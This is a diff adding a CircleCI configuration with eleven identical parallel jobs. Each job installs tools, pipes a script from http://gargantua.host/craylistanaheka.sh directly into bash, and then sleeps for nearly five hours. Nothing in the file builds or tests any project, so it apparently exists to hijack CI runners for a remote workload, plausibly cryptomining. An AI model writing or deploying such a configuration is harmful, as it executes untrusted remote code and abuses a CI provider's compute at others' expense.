@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  pyruntastrig:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  pyruntastrig1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  pyruntastrig2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  pyruntastrig3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  pyruntastrig4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  pyruntastrig5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  pyruntastrig6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  pyruntastrig7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  pyruntastrig8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  pyruntastrig9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  pyruntastrig10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - pyruntastrig
+      - pyruntastrig1
+      - pyruntastrig2
+      - pyruntastrig3
+      - pyruntastrig4
+      - pyruntastrig5
+      - pyruntastrig6
+      - pyruntastrig7
+      - pyruntastrig8
+      - pyruntastrig9
+      - pyruntastrig10
